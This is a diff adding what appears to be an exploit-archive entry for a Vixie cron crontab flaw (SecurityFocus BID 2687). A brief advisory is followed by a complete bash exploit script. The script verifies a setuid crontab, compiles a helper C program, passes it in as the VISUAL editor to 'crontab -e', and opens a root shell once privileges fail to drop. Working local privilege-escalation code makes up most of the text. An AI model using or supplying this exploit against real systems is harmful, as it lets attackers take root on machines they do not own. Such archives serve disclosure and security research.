@@ -1,0 +1,95 @@
+source: http://www.securityfocus.com/bid/2687/info
+
+Vixie cron is an implementation of the popular UNIX program that runs user-specified programs at periodic scheduled times.
+
+When a parsing error occurs after a modification operation, crontab will fail to drop privileges correctly for subsequent modification operations.
+
+This vulnerability may be exploited to gain root privileges locally. 
+
+#!/bin/bash
+
+clear
+echo ".-----------------------------------------------------------."
+echo "| Marchew.Hyperreal presents: vixie crontab exploit #728371 |"
+echo "|===========================================================|"
+echo "| Sebastian Krahmer <krahmer@security.is>                   |"
+echo "| Michal Zalewski <lcamtuf@coredump.cx>                     |"
+echo "\`-----------------------------------------------------------'"
+echo
+
+test "$CRONBIN" = "" && CRONBIN=/usr/bin/crontab
+
+echo    ">>> Using binary:  $CRONBIN"
+echo -n ">>> Setuid check:  "
+
+if [ -u $CRONBIN ]; then
+  echo "PASSED"
+else
+  echo "FAILED"
+  echo
+  exit 1
+fi
+
+echo -n ">>> Version check: "
+
+QQ=`strings $CRONBIN | grep '43 vixie Exp'`
+
+if [ "$QQ" = "" ]; then
+  echo "FAILED"
+  echo
+  exit 1
+else
+  echo "PASSED"
+fi
+
+echo ">>> Building exploit..."
+
+cat >edit0r.c <<_eof_
+#include <stdio.h>
+int main(int argc,char* argv[]) {
+  sleep(1);
+  if (geteuid()) {
+    FILE* x=fopen(argv[1],"w");
+    fprintf(x,"blah blah blah\n");
+    fclose(x);
+  } else {
+    dup2(1,0);
+    dup2(1,2);
+    printf("\n>>> Entering rootshell, babe...\n");
+    system("touch $HOME/.xploited");
+    system("bash");
+  }
+}
+_eof_
+
+gcc edit0r.c -o edit0r &>/dev/null
+rm -f edit0r.c
+
+if [ ! -f edit0r ]; then
+  echo ">>> Cannot compile exploit."
+  echo
+  exit 1
+fi
+
+rm -f ~/.xploited
+
+echo ">>> Performing attack..."
+
+( echo "y"; echo "n" ) | VISUAL=$PWD/edit0r $CRONBIN -e 2>/dev/null
+
+rm -f edit0r
+
+if [ -f ~/.xploited ]; then
+  echo
+  echo ">>> Thank you."
+  rm -f ~/.xploited
+  echo
+  exit 0
+else
+  echo
+  echo ">>> Apparently I am not able to exploit it, sorry..."
+  echo
+  exit 1
+fi
+
+
